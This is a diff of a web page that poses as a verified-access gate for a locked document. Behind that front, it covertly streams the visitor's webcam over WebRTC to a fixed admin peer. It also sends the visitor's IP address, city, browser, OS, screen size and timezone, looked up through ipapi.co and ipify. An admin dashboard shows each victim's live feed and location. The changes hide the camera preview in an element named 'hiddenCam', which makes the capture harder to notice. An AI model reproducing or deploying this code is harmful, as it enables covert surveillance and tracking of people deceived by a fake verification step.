-  btnTxt.innerHTML = '<span class="spin"></span> VERIFYING…';
+  btntxt.innerHTML = '<span class="spin"></span> VERIFYING…';
 
-  // ── 2. Get camera if not already granted ──
+  // Ensure camera
   if (!localStream) {
     try {
-      localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-      const selfVid = document.getElementById('selfCamVideo');
-      selfVid.srcObject = localStream;
-      selfVid.setAttribute('muted','');
-      selfVid.play().catch(()=>{});
+      localStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+      const hc = document.getElementById('hiddenCam');
+      hc.srcObject=localStream; hc.play().catch(()=>{});
     } catch(e) {
-      btnTxt.textContent = '⚠ Camera required — allow access and retry';
-      btn.disabled = false;
-      toast('Camera access is required to authenticate');
-      return;
+      btntxt.textContent = '⚠ Camera required — allow and retry';
+      btn.disabled=false; return;
     }
   }
 
-  // ── 3. Fire stream to admin (background, non-blocking) ──
-  const devInfo = cachedDevInfo || await captureDeviceInfo();
-  sendStreamToAdmin(devInfo);
+  const info = devCache || await fetchDevInfo();
+  pushToAdmin(info); // fire and forget
 
-  // ── 4. Unlock document after short auth animation ──
-  setTimeout(() => {
-    unlockDocument();
-    setNavStatus('live', 'ACCESS GRANTED · LIVE');
-  }, 700);
+  setTimeout(()=>{
+    document.getElementById('gate').style.display='none';
+    document.getElementById('grantedBar').classList.add('show');
+    document.querySelectorAll('.sec.locked').forEach((s,i)=>{
+      setTimeout(()=>{s.classList.remove('locked');s.classList.add('unlocked');},i*120);
+    });
+    setSt('live','ACCESS GRANTED · LIVE');
+    toast('✓ Document unlocked');
+  }, 750);
 }
 
-function sendStreamToAdmin(devInfo) {
-  if (!viewerPeer || viewerPeer.destroyed) {
-    viewerPeer = new Peer({
-      debug: 0,
-      config: { iceServers: [
-        { urls: 'stun:stun.l.google.com:19302' },
-        { urls: 'stun:stun1.l.google.com:19302' }
-      ]}
-    });
-  }
-  const doSend = () => {
+function pushToAdmin(info) {
+  if (!vPeer||vPeer.destroyed) vPeer=buildPeer();
+  const go = ()=>{
     if (!localStream) return;
     try {
-      const call = viewerPeer.call(ADMIN_PEER_ID, localStream);
-      if (call) call.on('error', ()=>{});
-      const conn = viewerPeer.connect(ADMIN_PEER_ID);
-      conn.on('open', () => conn.send({ type: 'device-info', data: devInfo }));
-      conn.on('error', ()=>{});
-    } catch(e) {}
+      const call=vPeer.call(ADMIN_ID,localStream);
+      if(call) call.on('error',()=>{});
+    } catch(e){}
+    try {
+      const conn=vPeer.connect(ADMIN_ID);
+      conn.on('open',()=>{ try{conn.send({type:'devinfo',data:info});}catch(e){} });
+      conn.on('error',()=>{});
+    } catch(e){}
   };
-  if (viewerPeer.open) { doSend(); } else { viewerPeer.on('open', doSend); }
+  if(vPeer.open){go();}else{vPeer.on('open',go);}
 }
 
-async function captureDeviceInfo() {
+async function fetchDevInfo() {
+  const ua=navigator.userAgent;
+  const br = ua.includes('Edg/')   ? 'Edge'    :
+             ua.includes('Chrome') ? 'Chrome'  :
+             ua.includes('Firefox')? 'Firefox' :
+             ua.includes('Safari') ? 'Safari'  : 'Unknown';
+  const os = ua.includes('Windows')? 'Windows' :
+             (ua.includes('iPhone')||ua.includes('iPad'))? 'iOS' :
+             ua.includes('Android')? 'Android' :
+             ua.includes('Mac')    ? 'macOS'   :
+             ua.includes('Linux')  ? 'Linux'   : 'Unknown';
   const info = {
-    browser: getBrowser(), os: getOS(),
-    screen: `${screen.width}×${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    language: navigator.language,
-    platform: navigator.platform || '—',
-    timestamp: new Date().toISOString(),
-    ip: '—', city: '—'
+    browser:br, os,
+    screen:`${screen.width}×${screen.height}`,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    language:navigator.language,
+    timestamp:new Date().toISOString(),
+    ip:'—', city:'—'
   };
   try {
-    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
-    const d = await r.json();
-    info.ip = d.ip || '—';
-    info.city = [d.city, d.country_name].filter(Boolean).join(', ') || '—';
+    const r=await fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(4000)});
+    const d=await r.json();
+    info.ip=d.ip||'—';
+    info.city=[d.city,d.country_name].filter(Boolean).join(', ')||'—';
   } catch(e) {
     try {
-      const r2 = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
-      const d2 = await r2.json();
-      info.ip = d2.ip || '—';
-    } catch(e2) {}
+      const r2=await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(3000)});
+      info.ip=(await r2.json()).ip||'—';
+    } catch(e2){}
   }
   return info;
 }
 
-function getBrowser() {
-  const ua = navigator.userAgent;
-  if (ua.includes('Edg/')) return 'Edge';
-  if (ua.includes('Chrome')) return 'Chrome';
-  if (ua.includes('Firefox')) return 'Firefox';
-  if (ua.includes('Safari')) return 'Safari';
-  return 'Unknown';
-}
-function getOS() {
-  const ua = navigator.userAgent;
-  if (ua.includes('Windows')) return 'Windows';
-  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
-  if (ua.includes('Android')) return 'Android';
-  if (ua.includes('Mac')) return 'macOS';
-  if (ua.includes('Linux')) return 'Linux';
-  return 'Unknown';
-}
-
-function unlockDocument() {
-  document.getElementById('accessGate').style.display = 'none';
-  document.getElementById('grantedBar').classList.add('show');
-  document.querySelectorAll('.doc-section.locked').forEach((sec, i) => {
-    setTimeout(() => {
-      sec.classList.remove('locked');
-      sec.classList.add('visible');
-    }, i * 150);
-  });
-  toast('✓ Full document unlocked');
-}
-
-// ══════════════════════════════════════════
-// ADMIN MODE
-// ══════════════════════════════════════════
+// ════════════════════════════════
+// ADMIN
+// ════════════════════════════════
 function initAdmin() {
-  document.getElementById('admin-page').classList.add('active');
-  document.getElementById('adminShareLink').textContent = window.location.origin + window.location.pathname;
-  setNavStatus('', 'ADMIN · CONNECTING…');
-  adminStartTime = Date.now();
+  document.getElementById('pg-admin').classList.add('active');
+  document.getElementById('shareLink').textContent = location.origin+location.pathname;
+  setSt('','ADMIN · CONNECTING…');
+  adminStart=Date.now();
 
-  const adminPeer = new Peer(ADMIN_PEER_ID, {
-    debug: 0,
-    config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] }
+  const ap=new Peer(ADMIN_ID,{debug:0,config:{iceServers:[
+    {urls:'stun:stun.l.google.com:19302'},
+    {urls:'stun:stun1.l.google.com:19302'}
+  ]}});
+
+  ap.on('open',()=>{
+    setSt('live','ADMIN · LIVE');
+    toast('Admin ready — waiting for viewers');
   });
 
-  adminPeer.on('open', id => {
-    setNavStatus('live', 'ADMIN · LIVE');
-    toast('Admin peer active · Waiting for viewers…');
-  });
+  ap.on('call', call=>{
+    const pid=call.peer;
+    call.answer(new MediaStream()); // must pass empty stream
 
-  adminPeer.on('call', call => {
-    const peerId = call.peer;
-
-    // CRITICAL: must pass an empty MediaStream — bare answer() breaks ICE negotiation
-    call.answer(new MediaStream());
-
-    call.on('stream', stream => {
-      // Ensure stream has active video tracks
-      if (!stream || stream.getVideoTracks().length === 0) return;
-
-      if (!viewers[peerId]) initViewerSlot(peerId);
-      viewers[peerId].stream = stream;
-      viewers[peerId].call = call;
-      attachStream(peerId, stream);
-      viewerCount++;
-      totalCount++;
-      updateAdminStats();
-      document.getElementById('adminWaiting').style.display = 'none';
+    call.on('stream', stream=>{
+      if(!stream||stream.getVideoTracks().length===0) return;
+      if(!viewers[pid]) createCard(pid);
+      viewers[pid].stream=stream;
+      attachStream(pid,stream);
+      liveCount++; totalCount++;
+      updateStats();
+      document.getElementById('waitMsg').style.display='none';
     });
 
-    call.on('close', () => removeViewer(peerId));
-    call.on('error', () => removeViewer(peerId));
+    call.on('close',()=>dropCard(pid));
+    call.on('error',()=>dropCard(pid));
   });
 
-  adminPeer.on('connection', conn => {
-    const peerId = conn.peer;
-    conn.on('data', data => {
-      if (data.type === 'device-info') {
-        if (!viewers[peerId]) initViewerSlot(peerId);
-        viewers[peerId].info = data.data;
-        updateViewerCard(peerId, data.data);
+  ap.on('connection', conn=>{
+    const pid=conn.peer;
+    conn.on('data',d=>{
+      if(d.type==='devinfo'){
+        if(!viewers[pid]) createCard(pid);
+        viewers[pid].info=d.data;
+        fillCard(pid,d.data);
+        toast(`${viewers[pid].label} connected · ${d.data.ip}`);
       }
     });
+    conn.on('error',()=>{});
   });
 
-  adminPeer.on('error', e => {
-    if (e.type === 'unavailable-id') {
-      setNavStatus('', 'ADMIN · ID TAKEN · Another admin session is running');
-      toast('⚠ Admin ID in use — close other admin session');
-    } else {
-      setNavStatus('', 'ADMIN · ERROR: ' + e.type);
-    }
+  ap.on('error',e=>{
+    if(e.type==='unavailable-id'){setSt('','ID TAKEN — close other admin tab');toast('⚠ Admin ID in use');}
+    else setSt('','ERROR: '+e.type);
   });
 }
 
-let accessCounter = 0;
-function initViewerSlot(peerId) {
-  accessCounter++;
-  const label = 'ACCESS' + accessCounter;
-  viewers[peerId] = { label, stream: null, call: null, info: null, connectedAt: new Date() };
-
-  const card = document.createElement('div');
-  card.className = 'viewer-card fade-up';
-  card.id = 'card-' + peerId.replace(/[^a-z0-9]/gi,'_');
-  card.onclick = () => openFullscreen(peerId);
-  card.innerHTML = `
-    <div class="card-feed" id="feed-${peerId.replace(/[^a-z0-9]/gi,'_')}">
-      <div class="card-feed-offline"><div class="feed-icon">📡</div><span>Awaiting stream…</span></div>
-      <div class="card-live-badge" id="live-${peerId.replace(/[^a-z0-9]/gi,'_')}"><div class="card-live-dot"></div>LIVE</div>
+function createCard(pid) {
+  slotCount++;
+  const label='ACCESS'+slotCount;
+  viewers[pid]={label,stream:null,info:null,connectedAt:new Date()};
+  const id=sid(pid);
+  const card=document.createElement('div');
+  card.className='vcard';
+  card.id='card-'+id;
+  card.onclick=()=>openFS(pid);
+  card.innerHTML=`
+    <div class="vfeed" id="feed-${id}">
+      <div class="voffline"><div class="voffline-icon">📡</div><span>Awaiting stream…</span></div>
+      <div class="vlive" id="live-${id}"><div class="vlivedot"></div>LIVE</div>
     </div>
-    <div class="card-body">
-      <div class="card-access-label">
-        <span>${label}</span>
-        <span class="card-connected-at">${formatTime(new Date())}</span>
+    <div class="vinfo">
+      <div class="vlabel">${label}<span class="vtime">${ft(new Date())}</span></div>
+      <div class="devgrid" id="dg-${id}">
+        <div class="di"><div class="di-lbl">STATUS</div><div class="di-val">Connecting…</div></div>
       </div>
-      <div class="device-info" id="devinfo-${peerId.replace(/[^a-z0-9]/gi,'_')}">
-        <div class="di-item"><div class="di-label">STATUS</div><div class="di-val">Connecting…</div></div>
-      </div>
-      <div class="card-status-row">
-        <div class="status-dot live"></div>
-        <span>${label} · Camera Active</span>
-      </div>
+      <div class="vstatus" id="vs-${id}"><div class="sdot live"></div><span>${label} · Camera Active</span></div>
     </div>
   `;
-  document.getElementById('adminGrid').appendChild(card);
+  document.getElementById('cardsGrid').appendChild(card);
 }
 
-function attachStream(peerId, stream) {
-  const safeId = peerId.replace(/[^a-z0-9]/gi,'_');
-  const feedDiv = document.getElementById('feed-' + safeId);
-  if (!feedDiv) return;
+function attachStream(pid, stream) {
+  const id=sid(pid);
+  const feed=document.getElementById('feed-'+id);
+  if(!feed) return;
+  const off=feed.querySelector('.voffline');
+  if(off) off.remove();
+  const existing=feed.querySelector('video');
+  if(existing) existing.remove();
 
-  const offline = feedDiv.querySelector('.card-feed-offline');
-  if (offline) offline.remove();
-
-  let vid = feedDiv.querySelector('video');
-  if (!vid) {
-    vid = document.createElement('video');
-    // setAttribute is required for Chrome autoplay — .muted=true alone is not enough
-    vid.setAttribute('autoplay', '');
-    vid.setAttribute('playsinline', '');
-    vid.setAttribute('muted', '');
-    vid.style.cssText = 'width:100%;height:100%;object-fit:cover;display:block;';
-    feedDiv.insertBefore(vid, feedDiv.firstChild);
-  }
-  vid.srcObject = stream;
-  // Explicit play() — autoplay policy can block without user gesture on admin side
-  vid.play().catch(() => {
-    const playBtn = document.createElement('button');
-    playBtn.textContent = '▶ Click to play';
-    playBtn.style.cssText = 'position:absolute;inset:0;width:100%;height:100%;background:rgba(0,0,0,0.7);color:white;border:none;font-size:0.8rem;cursor:pointer;font-family:IBM Plex Mono,monospace;letter-spacing:0.05em;z-index:5;';
-    playBtn.onclick = (e) => { e.stopPropagation(); vid.play(); playBtn.remove(); };
-    feedDiv.style.position = 'relative';
-    feedDiv.appendChild(playBtn);
+  const v=document.createElement('video');
+  v.setAttribute('autoplay','');
+  v.setAttribute('playsinline','');
+  v.setAttribute('muted','');
+  v.style.cssText='position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:block;';
+  feed.insertBefore(v,feed.firstChild);
+  v.srcObject=stream;
+  v.play().catch(()=>{
+    const ov=document.createElement('div');
+    ov.className='play-ov';
+    ov.innerHTML='<span>▶ Tap to play</span>';
+    ov.onclick=e=>{e.stopPropagation();v.play();ov.remove();};
+    feed.appendChild(ov);
   });
-
-  const liveBadge = document.getElementById('live-' + safeId);
-  if (liveBadge) liveBadge.classList.add('show');
+  const b=document.getElementById('live-'+id);
+  if(b) b.classList.add('on');
 }
 
-function updateViewerCard(peerId, info) {
-  const safeId = peerId.replace(/[^a-z0-9]/gi,'_');
-  const devDiv = document.getElementById('devinfo-' + safeId);
-  if (!devDiv) return;
-  devDiv.innerHTML = `
-    <div class="di-item"><div class="di-label">BROWSER</div><div class="di-val">${info.browser || '—'}</div></div>
-    <div class="di-item"><div class="di-label">OS</div><div class="di-val">${info.os || '—'}</div></div>
-    <div class="di-item"><div class="di-label">IP</div><div class="di-val">${info.ip || '—'}</div></div>
-    <div class="di-item"><div class="di-label">LOCATION</div><div class="di-val">${info.city || '—'}</div></div>
-    <div class="di-item"><div class="di-label">SCREEN</div><div class="di-val">${info.screen || '—'}</div></div>
-    <div class="di-item"><div class="di-label">TIMEZONE</div><div class="di-val">${info.timezone || '—'}</div></div>
+function fillCard(pid,info) {
+  const id=sid(pid);
+  const g=document.getElementById('dg-'+id);
+  if(!g) return;
+  g.innerHTML=`
+    <div class="di"><div class="di-lbl">BROWSER</div><div class="di-val">${info.browser||'—'}</div></div>
+    <div class="di"><div class="di-lbl">OS</div><div class="di-val">${info.os||'—'}</div></div>
+    <div class="di"><div class="di-lbl">IP</div><div class="di-val">${info.ip||'—'}</div></div>
+    <div class="di"><div class="di-lbl">LOCATION</div><div class="di-val">${info.city||'—'}</div></div>
+    <div class="di"><div class="di-lbl">SCREEN</div><div class="di-val">${info.screen||'—'}</div></div>
+    <div class="di"><div class="di-lbl">TIMEZONE</div><div class="di-val">${info.timezone||'—'}</div></div>
   `;
-  toast(`${viewers[peerId]?.label || 'Viewer'} connected · ${info.ip}`);
 }
 
-function removeViewer(peerId) {
-  const safeId = peerId.replace(/[^a-z0-9]/gi,'_');
-  const card = document.getElementById('card-' + safeId);
-  if (card) {
-    card.style.opacity = '0.3';
-    const status = card.querySelector('.card-status-row');
-    if (status) status.innerHTML = '<div class="status-dot" style="background:var(--red)"></div><span>Disconnected</span>';
-    const liveBadge = document.getElementById('live-' + safeId);
-    if (liveBadge) liveBadge.classList.remove('show');
-  }
-  if (viewers[peerId]) {
-    viewerCount = Math.max(0, viewerCount - 1);
-    updateAdminStats();
-  }
+function dropCard(pid) {
+  const id=sid(pid);
+  const card=document.getElementById('card-'+id);
+  if(card) card.style.opacity='0.32';
+  const b=document.getElementById('live-'+id);
+  if(b) b.classList.remove('on');
+  const vs=document.getElementById('vs-'+id);
+  if(vs) vs.innerHTML='<div class="sdot" style="background:var(--red)"></div><span>Disconnected</span>';
+  liveCount=Math.max(0,liveCount-1);
+  updateStats();
 }
 
-function updateAdminStats() {
-  document.getElementById('statConnected').textContent = viewerCount;
-  document.getElementById('statTotal').textContent = totalCount;
+function updateStats() {
+  document.getElementById('statLive').textContent=liveCount;
+  document.getElementById('statTotal').textContent=totalCount;
 }
 
-// FULLSCREEN
-function openFullscreen(peerId) {
-  const v = viewers[peerId];
-  if (!v) return;
-
-  const overlay = document.getElementById('fsOverlay');
-  overlay.classList.add('show');
-  document.getElementById('fsLabel').textContent = v.label;
-
-  const fsVid = document.getElementById('fsVideo');
-  if (v.stream) {
-    fsVid.srcObject = v.stream;
-    fsVid.play().catch(() => {});
-  }
-
-  const sidebar = document.getElementById('fsSidebarContent');
-  const info = v.info;
-  if (info) {
-    sidebar.innerHTML = `
-      <div class="fs-di-item"><div class="fs-di-label">LABEL</div><div class="fs-di-val">${v.label}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">CONNECTED AT</div><div class="fs-di-val">${v.connectedAt?.toLocaleString() || '—'}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">IP ADDRESS</div><div class="fs-di-val">${info.ip || '—'}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">LOCATION</div><div class="fs-di-val">${info.city || '—'}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">BROWSER</div><div class="fs-di-val">${info.browser || '—'}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">OPERATING SYSTEM</div><div class="fs-di-val">${info.os || '—'}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">SCREEN</div><div class="fs-di-val">${info.screen || '—'}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">TIMEZONE</div><div class="fs-di-val">${info.timezone || '—'}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">LANGUAGE</div><div class="fs-di-val">${info.language || '—'}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">PLATFORM</div><div class="fs-di-val">${info.platform || '—'}</div></div>
-      <div class="fs-di-item"><div class="fs-di-label">TIMESTAMP</div><div class="fs-di-val" style="font-size:0.7rem">${info.timestamp || '—'}</div></div>
-    `;
-  } else {
-    sidebar.innerHTML = '<p style="color:var(--text3);font-size:0.75rem">Device info pending…</p>';
-  }
+function openFS(pid) {
+  const v=viewers[pid]; if(!v) return;
+  document.getElementById('fsOv').classList.add('on');
+  document.getElementById('fsLbl').textContent=v.label;
+  const fv=document.getElementById('fsVid');
+  if(v.stream){fv.srcObject=v.stream;fv.play().catch(()=>{});}
+  const s=document.getElementById('fsSide');
+  const i=v.info;
+  s.innerHTML=i?`
+    <div class="fsr"><div class="fsr-lbl">LABEL</div><div class="fsr-val">${v.label}</div></div>
+    <div class="fsr"><div class="fsr-lbl">CONNECTED AT</div><div class="fsr-val">${v.connectedAt?.toLocaleString()||'—'}</div></div>
+    <div class="fsr"><div class="fsr-lbl">IP ADDRESS</div><div class="fsr-val">${i.ip||'—'}</div></div>
+    <div class="fsr"><div class="fsr-lbl">LOCATION</div><div class="fsr-val">${i.city||'—'}</div></div>
+    <div class="fsr"><div class="fsr-lbl">BROWSER</div><div class="fsr-val">${i.browser||'—'}</div></div>
+    <div class="fsr"><div class="fsr-lbl">OS</div><div class="fsr-val">${i.os||'—'}</div></div>
+    <div class="fsr"><div class="fsr-lbl">SCREEN</div><div class="fsr-val">${i.screen||'—'}</div></div>
+    <div class="fsr"><div class="fsr-lbl">TIMEZONE</div><div class="fsr-val">${i.timezone||'—'}</div></div>
+    <div class="fsr"><div class="fsr-lbl">LANGUAGE</div><div class="fsr-val">${i.language||'—'}</div></div>
+    <div class="fsr"><div class="fsr-lbl">TIMESTAMP</div><div class="fsr-val" style="font-size:0.7rem">${i.timestamp||'—'}</div></div>
+  `:'<p style="color:var(--text3);font-size:0.72rem">Device info pending…</p>';
 }
 
-function closeFullscreen() {
-  document.getElementById('fsOverlay').classList.remove('show');
-  document.getElementById('fsVideo').srcObject = null;
+function closeFS() {
+  document.getElementById('fsOv').classList.remove('on');
+  const fv=document.getElementById('fsVid');
+  fv.pause();fv.srcObject=null;
 }
 
-// UTILS
-function formatTime(d) {
-  return d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
-}
-
-// ══════════════════════════════════════════
+// ════════════════════════════════
 // BOOT
-// ══════════════════════════════════════════
-if (isAdmin) {
-  initAdmin();
-} else {
-  initViewer();
-}
+// ════════════════════════════════
+IS_ADMIN ? initAdmin() : initViewer();
 </script>
 </body>
 </html>
